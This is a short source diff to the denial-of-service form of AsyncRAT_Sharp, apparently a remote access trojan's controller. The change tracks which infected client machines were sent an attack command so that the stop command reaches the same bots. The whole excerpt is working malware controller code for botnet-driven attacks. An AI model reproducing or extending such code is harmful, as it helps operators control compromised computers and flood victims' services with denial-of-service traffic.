@@ -17,9 +17,10 @@ namespace AsyncRAT_Sharp.Forms
 {
     public partial class FormDOS : Form
     {
-       private TimeSpan timespan;
-       private Stopwatch stopwatch;
+        private TimeSpan timespan;
+        private Stopwatch stopwatch;
         private string status = "is online";
+        private List<Clients> selectedClients = new List<Clients>();
         public FormDOS()
         {
             InitializeComponent();
@@ -58,6 +59,7 @@ namespace AsyncRAT_Sharp.Forms
                     foreach (ListViewItem itm in Program.form1.listView1.SelectedItems)
                     {
                         Clients client = (Clients)itm.Tag;
+                        selectedClients.Add(client);
                         client.LV.ForeColor = Color.Green;
                         ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                     }
@@ -88,12 +90,13 @@ namespace AsyncRAT_Sharp.Forms
             }
             else
             {
-                foreach (ListViewItem itm in Program.form1.listView1.SelectedItems)
+                foreach (Clients client in selectedClients.ToList())
                 {
-                    Clients client = (Clients)itm.Tag;
                     client.LV.ForeColor = Color.Empty;
                     ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                 }
+                selectedClients.Clear();
+                selectedClients = new List<Clients>();
             }
             btnAttack.Enabled = true;
             btnStop.Enabled = false;
